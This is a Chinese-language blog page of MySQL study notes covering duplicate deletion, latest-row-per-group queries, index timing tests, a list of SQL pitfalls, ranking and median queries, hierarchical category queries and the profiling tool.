<h3 id="删除重复数据"><a href="#删除重复数据" class="headerlink" title="删除重复数据"></a>删除重复数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select *<span class="keyword">from</span> hso_min WHERE id not IN (SELECT bid FROM (SELECT min(id) <span class="keyword">as</span> bid FROM hso_min where symbol=<span class="string">'xau'</span> and uts&gt;<span class="number">1565971200</span>  GROUP BY min)<span class="keyword">as</span> b) and symbol=<span class="string">'xau'</span> and uts&gt;<span class="number">1565971200</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> hso_min WHERE id not IN (SELECT bid FROM (SELECT min(id) <span class="keyword">as</span> bid FROM hso_min where symbol=<span class="string">'xau'</span> and uts&gt;<span class="number">1565971200</span>  GROUP BY min)<span class="keyword">as</span> b) and symbol=<span class="string">'xau'</span> and uts&gt;<span class="number">1565971200</span>;</span><br></pre></td></tr></table></figure>
<h3 id="每个用户最新一条"><a href="#每个用户最新一条" class="headerlink" title="每个用户最新一条"></a>每个用户最新一条</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">表一 messages</span><br><span class="line"></span><br><span class="line">id (PRIMARY KEY)、to_user_id、from_user_id、content、created_at</span><br><span class="line">表二 user</span><br><span class="line"></span><br><span class="line">id (PRIMARY KEY)、name、created_at</span><br><span class="line">查询当天最新的 messages 并分页，要求同 user 只取一条 messages</span><br><span class="line"></span><br><span class="line">group by 执行在 order by 之前，order by 只是对group by 结果进行排序。可以参考类似文章https:<span class="comment">//blog.csdn.net/zcd3f/article/details/84767206</span></span><br><span class="line">SELECT max(created_at),from_user_id,content <span class="keyword">from</span> messages WHERE created_at like <span class="string">"%2019-08-21%"</span> GROUP BY from_user_id ORDER BY from_user_id desc limit <span class="number">100</span>;</span><br><span class="line">DB::table(<span class="string">'messages as t1'</span>)</span><br><span class="line">  -&gt;leftJoin(<span class="string">'messages as t2'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$join</span>) </span>&#123;</span><br><span class="line">    $join-&gt;on(<span class="string">'t1.from_user_id'</span>, <span class="string">'='</span>, <span class="string">'t2.from_user_id'</span>)-&gt;on(<span class="string">'t1.id'</span>, <span class="string">'&lt;'</span>, <span class="string">'t2.id'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">  -&gt;leftJoin(<span class="string">'user as t3'</span>, <span class="string">'t1.from_user_id'</span>, <span class="string">'='</span>, <span class="string">'t3.id'</span>)</span><br><span class="line">  -&gt;where(<span class="string">'t1.to_user_id'</span>, $id)</span><br><span class="line">  -&gt;whereNull(<span class="string">'t2.id'</span>)-&gt;paginate(<span class="number">15</span>);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32919 </span></span><br><span class="line">需要查询表里不同分类下的order最大的记录</span><br><span class="line">SELECT id,tid,<span class="string">`order`</span>, FROM_UNIXTIME(yestime) FROM tfen</span><br><span class="line">WHERE tid IN(<span class="number">7512</span>, <span class="number">7514</span>) </span><br><span class="line">GROUP BY tid </span><br><span class="line">ORDER BY <span class="string">`order`</span> DESC ;</span><br><span class="line">结果不对</span><br><span class="line">SELECT id,tid,<span class="string">`order`</span>,FROM_UNIXTIME(yestime) FROM (</span><br><span class="line">SELECT * FROM tfen WHERE tid IN(<span class="number">7512</span>, <span class="number">7514</span>) ORDER BY <span class="string">`order`</span> DESC </span><br><span class="line">) AS t </span><br><span class="line">GROUP BY tid</span><br><span class="line">除非记录完全相同，否则 mysql 不保证每次 group by 结果相同</span><br></pre></td></tr></table></figure>
<h3 id="mysql索引测试"><a href="#mysql索引测试" class="headerlink" title="mysql索引测试"></a>mysql索引测试</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">命令行直接查询sql</span><br><span class="line">mysql -vv -uroot -h127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span> -P3306 -p123456 -Dtest -e<span class="string">"select count(*) from test where a = 123467 and b &gt; 123954"</span>;</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">--------------</span><br><span class="line">select count(*) <span class="keyword">from</span> test where a = <span class="number">123467</span> and b &gt; <span class="number">123954</span></span><br><span class="line">--------------</span><br><span class="line"></span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|        <span class="number">0</span> |</span><br><span class="line">+----------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">4.16</span> sec)</span><br><span class="line">localhost:~ ws$ mysql -vv -uws -p123456 -Dtest -e<span class="string">"select sql_no_cache count(*) from test where a = 26727 and b &gt; 15512"</span></span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">--------------</span><br><span class="line">select sql_no_cache count(*) <span class="keyword">from</span> test where a = <span class="number">26727</span> and b &gt; <span class="number">15512</span></span><br><span class="line">--------------</span><br><span class="line"></span><br><span class="line">+----------+</span><br><span class="line">| count(*) |</span><br><span class="line">+----------+</span><br><span class="line">|       <span class="number">31</span> |</span><br><span class="line">+----------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set, <span class="number">1</span> warning (<span class="number">0.32</span> sec)</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/33768</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-避坑宝典"><a href="#MySQL-避坑宝典" class="headerlink" title="MySQL 避坑宝典"></a>MySQL 避坑宝典</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">修改表的默认字符集不会改表各个字段的字符集   ALTER TABLE tbl_name [DEFAULT] CHARACTER SET <span class="string">'UTF8'</span> 误认为会修改所有字段的字符集，但实际上它只会影响后续新增的字段不会改表已有字段的字符集。如果想修改整张表所有字段的字符集建议使用 ALTER TABLE tbl_name CONVERT TO CHARACTER SET charset_name;</span><br><span class="line"></span><br><span class="line"> 隐式类型转换有无法命中索引的风险，在高并发、大数据量的情况下，命不中索引带来的后果非常严</span><br><span class="line"> SELECT * FROM sakila.film WHERE length &gt;= <span class="string">'60'</span>;</span><br><span class="line"></span><br><span class="line">对于 SELECT COUNT (*) 类型的请求如果不要求精度，建议使用 SHOW TABLE STATUS 或 EXPLAIN 替代。</span><br><span class="line"></span><br><span class="line">默认 MySQL 会对 <span class="string">'GROUP BY col1, col2, ...'</span> 请求按如下顺序排序 <span class="string">'ORDER BY col1, col2, ...'</span>。如果 GROUP BY 语句不指定 ORDER BY 条件会导致无谓的排序产生，如果不需要排序建议添加 <span class="string">'ORDER BY NULL'</span>。</span><br><span class="line">select c1,c2,c3 <span class="keyword">from</span> t1 where c1=<span class="string">'foo'</span> group by c2</span><br><span class="line">当 GROUP BY 条件为表达式或函数时会使用到临时表，如果在未指定 WHERE 或 WHERE 条件返回的结果集较大时性能会很差。select description <span class="keyword">from</span> film where title =<span class="string">'ACADEMY DINOSAUR'</span> GROUP BY length-language_id;</span><br><span class="line"> 删除全表时建议使用 TRUNCATE 替代 DELETE</span><br><span class="line"> 当表结构发生变更，如果 INSERT 或 REPLACE 请求不明确指定列名，请求的结果将会与预想的不同；建议使用 “INSERT INTO tbl (col1，col2) VALUES ...” 代替。</span><br><span class="line"> 整型定义建议采用 INT (<span class="number">10</span>) 或 BIGINT (<span class="number">20</span>)</span><br><span class="line"> INT (M) 在 integer 数据类型中，M 表示最大显示宽度。 在 INT (M) 中，M 的值跟 INT (M) 所占多少存储空间并无任何关系。 INT (<span class="number">3</span>)、INT (<span class="number">4</span>)、INT (<span class="number">8</span>) 在磁盘上都是占用 <span class="number">4</span> bytes 的存储空间。</span><br><span class="line"> varchar 是可变长字符串，不预先分配存储空间，长度不要超过 <span class="number">255</span>，如果存储长度过长 MySQL 将定义字段类型为 text，独立出来一张表，用主键来对应，避免影响其它字段索引效率。</span><br><span class="line"> COUNT (DISTINCT col) 计算该列除 NULL 之外的不重复行数，注意 COUNT (DISTINCT col, col2) 如果其中一列全为 NULL 那么即使另一列有不同的值，也返回 <span class="number">0</span>。</span><br><span class="line"></span><br><span class="line">MyISAM 表对于 COUNT (*) 统计全表行数进行了特殊的优化，通常情况下非常快。但对于非 MyISAM 表或指定了某些 WHERE 条件，COUNT (*) 操作需要扫描大量的行才能获取精确的结果，性能也因此不佳。有时候某些业务场景并不需要完全精确的 COUNT 值，此时可以用近似值来代替。EXPLAIN 出来的优化器估算的行数就是一个不错的近似值，执行 EXPLAIN 并不需要真正去执行查询，所以成本很低。</span><br><span class="line">不要使用 COUNT (col) 或 COUNT (常量) 来替代 COUNT (*), COUNT (*) 是 SQL92 定义的标准统计行数的方法，跟数据无关，跟 NULL 和非 NULL 也无关。</span><br><span class="line">当某一列的值全是 NULL 时，COUNT (COL) 的返回结果为 <span class="number">0</span>, 但 SUM (COL) 的返回结果为 NULL，因此使用 SUM () 时需注意 NPE 问题。可以使用如下方式来避免 SUM 的 NPE 问题: SELECT IF (ISNULL (SUM (COL)), <span class="number">0</span>, SUM (COL)) FROM tbl</span><br><span class="line"> 触发器的执行没有反馈和日志，隐藏了实际的执行步骤，当数据库出现问题是，不能通过慢日志分析触发器的具体执行情况，不易发现问题。在 MySQL 中，触发器不能临时关闭或打开，在数据迁移或数据恢复等场景下，需要临时 drop 触发器，可能影响到生产环境。</span><br><span class="line">不建议使用存储过程  存储过程无版本控制，配合业务的存储过程升级很难做到业务无感知。存储过程在拓展和移植上也存在问题。</span><br><span class="line">当前 MySQL 版本不支持在子查询中进行 <span class="string">'LIMIT &amp; IN/ALL/ANY/SOME'</span>。</span><br><span class="line">SELECT * FROM staff WHERE name IN (SELECT NAME FROM customer ORDER BY name LIMIT <span class="number">1</span>)</span><br><span class="line"> DISTINCT 关键字在对元组排序后删除重复。相反，考虑使用一个带有 EXISTS 关键字的子查询，您可以避免返回整个表。</span><br><span class="line"> SELECT DISTINCT c.c_id, c.c_name FROM c,e WHERE e.c_id = c.c_id</span><br><span class="line"></span><br><span class="line">DUAL 表为虚拟表，不需要创建即可使用，也不建议服务以 DUAL 命名表。</span><br><span class="line"></span><br><span class="line">MySQL 将外部查询中的每一行作为依赖子查询执行子查询。 这是导致严重性能问题的常见原因。这可能会在 MySQL <span class="number">5.6</span> 版本中得到改善，但对于 <span class="number">5.1</span> 及更早版本，建议将该类查询分别重写为 JOIN 或 LEFT OUTER JOIN。</span><br><span class="line">建议普通二级索引以 idx_为前缀，唯一索引以 uniq_为前缀。</span><br><span class="line"><span class="string">"&lt;&gt;"</span> 才是标准 SQL 中的不等于运算符 不是！=</span><br><span class="line">数据库必须字段 （<span class="string">`last_update_time`</span> TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT <span class="string">' 最后更新时间 '</span>; <span class="string">`is_del`</span> TINYINT (<span class="number">1</span>) UNSIGNED NOT NULL DEFAULT <span class="string">'0'</span> COMMENT <span class="string">' 是否删除 0：未删除 1：已删除 '</span>）</span><br><span class="line">建议使用 datetime 替换 timestamp 类型，且默认值设置为 <span class="number">1970</span><span class="number">-01</span><span class="number">-01</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>。 datetime 类型能保存大范围的值，从 <span class="number">1001</span> 年到 <span class="number">9999</span> 年，且与时区无关。使用 <span class="number">8</span> 个字节的存储空间（比 timestamp 多出 <span class="number">4</span> 字节）</span><br><span class="line">SELECT INTO OUTFILE 需要授予 FILE 权限，这通过会引入安全问题。LOAD DATA 虽然可以提高数据导入速度，但同时也可能导致从库同步延迟过大。</span><br><span class="line">LOAD DATA INFILE <span class="string">'data.txt'</span> INTO TABLE db2.my_table;</span><br><span class="line">UPDATE/DELETE 操作不要指定 ORDER BY 条件。</span><br><span class="line">UPDATE/DELETE 操作使用 LIMIT 条件和不添加 WHERE 条件一样危险，它可将会导致主从数据不一致或从库同步中断。</span><br><span class="line">没有 ORDER BY 的 LIMIT 会导致非确定性的结果，这取决于查询执行计划。</span><br><span class="line">SQL 返回的列既不在聚合函数中也不是 GROUP BY 表达式的列中，因此这些值的结果将是非确定性的。如：select a, b, c <span class="keyword">from</span> tbl where foo=<span class="string">"bar"</span> group by a，该 SQL 返回的结果就是不确定的。</span><br><span class="line">字符串字面上看起来像 IP 地址，但不是 INET_ATON () 的参数，表示数据被存储为字符而不是整数。将 IP 地址存储为整数更为有效。</span><br><span class="line">当主键为自增键时使用 INSERT ON DUPLICATE KEY UPDATE 可能会导致主键出现大量不连续快速增长，导致主键快速溢出无法继续写入。极端情况下还有可能导致主从数据不一致。</span><br><span class="line">因为 SQL_CALC_FOUND_ROWS 不能很好地扩展，所以可能导致性能问题；建议业务使用其他策略来替代 SQL_CALC_FOUND_ROWS 提供的计数功能，比如：分页结果展示等。 select SQL_CALC_FOUND_ROWS col <span class="keyword">from</span> tbl where id&gt;<span class="number">1000</span></span><br><span class="line"></span><br><span class="line">请提前检查添加唯一索引列的数据唯一性，如果数据不唯一在线表结构调整时将有可能自动将重复列删除，这有可能导致数据丢失。</span><br><span class="line">在 MySQL <span class="number">8.0</span> 之前当 ORDER BY 多个列指定的排序方向不同时将无法使用已经建立的索引。SELECT * FROM tbl ORDER BY a DESC, b ASC;</span><br><span class="line"> 未指定主键或主键非 bigint，建议将主键设置为 bigint unsigned。 无主键或唯一键，无法在线变更表结构</span><br><span class="line"> 当需要同时删除或更新多张表时建议使用简单语句，一条 SQL 只删除或更新一张表，尽量不要将多张表的操作在同一条语句。</span><br><span class="line"> UPDATE users u LEFT JOIN hobby h ON u.id = h.uid SET u.name = <span class="string">'pianoboy'</span> WHERE h.hobby = <span class="string">'piano'</span>;</span><br><span class="line">将嵌套查询重写为 JOIN 通常会导致更高效的执行和更有效的优化</span><br><span class="line">https:<span class="comment">//github.com/XiaoMi/soar/blob/master/doc/heuristic.md</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/25270</span></span><br></pre></td></tr></table></figure>
<h3 id="数据中的排名"><a href="#数据中的排名" class="headerlink" title="数据中的排名"></a>数据中的排名</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS <span class="string">`employee`</span> (</span><br><span class="line">  <span class="string">`id`</span>     INT                  AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">  <span class="string">`name`</span>   VARCHAR(<span class="number">10</span>) NOT NULL DEFAULT <span class="string">''</span>,</span><br><span class="line">  <span class="string">`income`</span> INT         NOT NULL DEFAULT <span class="string">'0'</span></span><br><span class="line">)</span><br><span class="line">  ENGINE = InnoDB</span><br><span class="line">  DEFAULT CHARSET = utf8;</span><br><span class="line"></span><br><span class="line">INSERT INTO <span class="string">`employee`</span> (<span class="string">`name`</span>, <span class="string">`income`</span>)</span><br><span class="line">VALUES (<span class="string">'麻子'</span>, <span class="number">20000</span>);</span><br><span class="line">INSERT INTO <span class="string">`employee`</span> (<span class="string">`name`</span>, <span class="string">`income`</span>)</span><br><span class="line">VALUES (<span class="string">'李四'</span>, <span class="number">12000</span>);</span><br><span class="line">INSERT INTO <span class="string">`employee`</span> (<span class="string">`name`</span>, <span class="string">`income`</span>)</span><br><span class="line">VALUES (<span class="string">'张三'</span>, <span class="number">10000</span>);</span><br><span class="line">INSERT INTO <span class="string">`employee`</span> (<span class="string">`name`</span>, <span class="string">`income`</span>)</span><br><span class="line">VALUES (<span class="string">'王二'</span>, <span class="number">16000</span>);</span><br><span class="line">INSERT INTO <span class="string">`employee`</span> (<span class="string">`name`</span>, <span class="string">`income`</span>)</span><br><span class="line">VALUES (<span class="string">'土豪'</span>, <span class="number">40000</span>);</span><br><span class="line">SELECT t1.name, t1.income, COUNT(*) AS rank</span><br><span class="line">FROM employee AS t1,</span><br><span class="line">     employee AS t2</span><br><span class="line">WHERE t1.income &lt; t2.income</span><br><span class="line">   OR (t1.income = t2.income AND t1.name &lt;= t2.name)</span><br><span class="line">GROUP BY t1.name, t1.income</span><br><span class="line">ORDER BY rank;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">name	income	rank</span><br><span class="line">土豪	<span class="number">40000</span>	<span class="number">1</span></span><br><span class="line">麻子	<span class="number">20000</span>	<span class="number">2</span></span><br><span class="line">王二	<span class="number">16000</span>	<span class="number">3</span></span><br><span class="line">李四	<span class="number">12000</span>	<span class="number">4</span></span><br><span class="line">张三	<span class="number">10000</span>	<span class="number">5</span></span><br><span class="line">找出中位数的排名数字：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT (COUNT(*) + <span class="number">1</span>) DIV <span class="number">2</span> <span class="keyword">as</span> rankFROM employee;</span><br><span class="line">从一组数据中获得中位数</span><br><span class="line">SELECT income AS median</span><br><span class="line">FROM (SELECT t1.name, t1.income, COUNT(*) AS rank</span><br><span class="line">      FROM employee AS t1,</span><br><span class="line">           employee AS t2</span><br><span class="line">      WHERE t1.income &lt; t2.income</span><br><span class="line">         OR (t1.income = t2.income AND t1.name &lt;= t2.name)</span><br><span class="line">      GROUP BY t1.name, t1.income</span><br><span class="line">      ORDER BY rank) t3</span><br><span class="line">WHERE rank = (SELECT (COUNT(*) + <span class="number">1</span>) DIV <span class="number">2</span> FROM employee)</span><br><span class="line">索引的类型，从好到坏的情况是：system&gt;<span class="keyword">const</span>&gt;range&gt;index&gt;All</span><br><span class="line">https:<span class="comment">//learnku.com/articles/18390</span></span><br></pre></td></tr></table></figure>
<h3 id="树查询"><a href="#树查询" class="headerlink" title="树查询"></a>树查询</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE category(</span><br><span class="line">        category_id INT AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">        name VARCHAR(<span class="number">20</span>) NOT NULL,</span><br><span class="line">        parent INT DEFAULT NULL</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">INSERT INTO category VALUES(<span class="number">1</span>,<span class="string">'ELECTRONICS'</span>,NULL),(<span class="number">2</span>,<span class="string">'TELEVISIONS'</span>,<span class="number">1</span>),(<span class="number">3</span>,<span class="string">'TUBE'</span>,<span class="number">2</span>),</span><br><span class="line">        (<span class="number">4</span>,<span class="string">'LCD'</span>,<span class="number">2</span>),(<span class="number">5</span>,<span class="string">'PLASMA'</span>,<span class="number">2</span>),(<span class="number">6</span>,<span class="string">'PORTABLE ELECTRONICS'</span>,<span class="number">1</span>),(<span class="number">7</span>,<span class="string">'MP3 PLAYERS'</span>,<span class="number">6</span>),(<span class="number">8</span>,<span class="string">'FLASH'</span>,<span class="number">7</span>),</span><br><span class="line">        (<span class="number">9</span>,<span class="string">'CD PLAYERS'</span>,<span class="number">6</span>),(<span class="number">10</span>,<span class="string">'2 WAY RADIOS'</span>,<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">SELECT * FROM category ORDER BY category_id;</span><br><span class="line">+-------------+----------------------+--------+</span><br><span class="line">| category_id | name                 | parent |</span><br><span class="line">+-------------+----------------------+--------+</span><br><span class="line">|           <span class="number">1</span> | ELECTRONICS          |   NULL |</span><br><span class="line">|           <span class="number">2</span> | TELEVISIONS          |      <span class="number">1</span> |</span><br><span class="line">|           <span class="number">3</span> | TUBE                 |      <span class="number">2</span> |</span><br><span class="line">|           <span class="number">4</span> | LCD                  |      <span class="number">2</span> |</span><br><span class="line">|           <span class="number">5</span> | PLASMA               |      <span class="number">2</span> |</span><br><span class="line">|           <span class="number">6</span> | PORTABLE ELECTRONICS |      <span class="number">1</span> |</span><br><span class="line">|           <span class="number">7</span> | MP3 PLAYERS          |      <span class="number">6</span> |</span><br><span class="line">|           <span class="number">8</span> | FLASH                |      <span class="number">7</span> |</span><br><span class="line">|           <span class="number">9</span> | CD PLAYERS           |      <span class="number">6</span> |</span><br><span class="line">|          <span class="number">10</span> | <span class="number">2</span> WAY RADIOS         |      <span class="number">6</span> |</span><br><span class="line">+-------------+----------------------+--------+</span><br><span class="line">SELECT t1.name AS lev1, t2.name <span class="keyword">as</span> lev2, t3.name <span class="keyword">as</span> lev3, t4.name <span class="keyword">as</span> lev4</span><br><span class="line">FROM category AS t1</span><br><span class="line">LEFT JOIN category AS t2 ON t2.parent = t1.category_id</span><br><span class="line">LEFT JOIN category AS t3 ON t3.parent = t2.category_id</span><br><span class="line">LEFT JOIN category AS t4 ON t4.parent = t3.category_id</span><br><span class="line">WHERE t1.name = <span class="string">'ELECTRONICS'</span>;</span><br><span class="line"></span><br><span class="line">+-------------+----------------------+--------------+-------+</span><br><span class="line">| lev1        | lev2                 | lev3         | lev4  |</span><br><span class="line">+-------------+----------------------+--------------+-------+</span><br><span class="line">| ELECTRONICS | TELEVISIONS          | TUBE         | NULL  |</span><br><span class="line">| ELECTRONICS | TELEVISIONS          | LCD          | NULL  |</span><br><span class="line">| ELECTRONICS | TELEVISIONS          | PLASMA       | NULL  |</span><br><span class="line">| ELECTRONICS | PORTABLE ELECTRONICS | MP3 PLAYERS  | FLASH |</span><br><span class="line">| ELECTRONICS | PORTABLE ELECTRONICS | CD PLAYERS   | NULL  |</span><br><span class="line">| ELECTRONICS | PORTABLE ELECTRONICS | <span class="number">2</span> WAY RADIOS | NULL  |</span><br><span class="line">+-------------+----------------------+--------------+-------+</span><br><span class="line">SELECT t1.name FROM</span><br><span class="line">category AS t1 LEFT JOIN category <span class="keyword">as</span> t2</span><br><span class="line">ON t1.category_id = t2.parent</span><br><span class="line">WHERE t2.category_id IS NULL;</span><br><span class="line"></span><br><span class="line">+--------------+</span><br><span class="line">| name         |</span><br><span class="line">+--------------+</span><br><span class="line">| TUBE         |</span><br><span class="line">| LCD          |</span><br><span class="line">| PLASMA       |</span><br><span class="line">| FLASH        |</span><br><span class="line">| CD PLAYERS   |</span><br><span class="line">| <span class="number">2</span> WAY RADIOS |</span><br><span class="line">+--------------+</span><br><span class="line">http:<span class="comment">//mikehillyer.com/articles/managing-hierarchical-data-in-mysql/</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/33688</span></span><br></pre></td></tr></table></figure>
<h3 id="profile-工具"><a href="#profile-工具" class="headerlink" title="profile 工具"></a>profile 工具</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//开启操作</span></span><br><span class="line">mysql&gt; set profiling = on;</span><br><span class="line">Query OK, <span class="number">0</span> rows affected, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看是否开启成功</span></span><br><span class="line">mysql&gt; show variables like <span class="string">'%profil%'</span>;</span><br><span class="line">+------------------------+-------+</span><br><span class="line">| Variable_name          | Value |</span><br><span class="line">+------------------------+-------+</span><br><span class="line">| have_profiling         | YES   |</span><br><span class="line">| profiling              | ON    |<span class="comment">//开启成功</span></span><br><span class="line">| profiling_history_size | <span class="number">15</span>    |</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> article where no_index=<span class="number">666666</span>;</span><br><span class="line">mysql&gt; show profiles;</span><br><span class="line">+----------+------------+---------------------------------------------+</span><br><span class="line">| Query_ID | Duration   | Query                                       |</span><br><span class="line">+----------+------------+---------------------------------------------+</span><br><span class="line">|        <span class="number">1</span> | <span class="number">0.00150700</span> | show variables like <span class="string">'%profil%'</span>              |</span><br><span class="line">|        <span class="number">2</span> | <span class="number">0.01481100</span> | select * <span class="keyword">from</span> article where no_index=<span class="number">666666</span> |</span><br><span class="line">+----------+------------+---------------------------------------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show profile <span class="keyword">for</span> query <span class="number">2</span>;</span><br><span class="line">+----------------------+----------+</span><br><span class="line">| Status               | Duration |</span><br><span class="line">+----------------------+----------+</span><br><span class="line">| starting             | <span class="number">0.000291</span> |</span><br><span class="line">| checking permissions | <span class="number">0.000007</span> |</span><br></pre></td></tr></table></figure>
